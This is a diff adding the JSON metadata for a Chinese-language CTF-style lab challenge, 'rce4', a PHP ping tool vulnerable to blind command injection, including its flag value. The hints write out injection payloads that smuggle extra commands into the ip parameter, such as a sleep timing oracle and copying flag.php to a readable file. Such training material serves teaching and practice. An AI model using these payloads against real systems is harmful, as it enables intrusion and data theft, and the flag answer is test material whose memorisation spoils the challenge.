@@ -1,0 +1,24 @@
+{
+  "id": "rce4",
+  "category": "rce",
+  "title": "Ping 诊断工具 v4 · 无回显命令注入（盲注）",
+  "difficulty": "medium",
+  "url_path": "/rce4",
+  "runtime": "php",
+  "entry": "index.php",
+  "flag": "flag{rce4_00317f34}",
+  "knowledge": [
+    "无回显/盲命令注入",
+    "时间盲注 sleep 布尔 oracle",
+    "带外落盘 cp/cat>文件再访问",
+    "HTTP/DNS 外带概念"
+  ],
+  "hints": [
+    "输出被 >/dev/null 丢弃，但页面显示耗时——?ip=127.0.0.1;sleep 5 试试",
+    "if grep -q rce4 flag.php;then sleep 4;fi 可以把判断变成耗时差异（布尔 oracle）",
+    "?ip=127.0.0.1;cp flag.php out.txt 然后访问 /rce4/out.txt（注意程序尾部自带 >/dev/null，直接 >文件 会被覆盖，可用 cp 或 tee）"
+  ],
+  "writeup": "writeup.md",
+  "prev": "rce3",
+  "next": "rce5"
+}
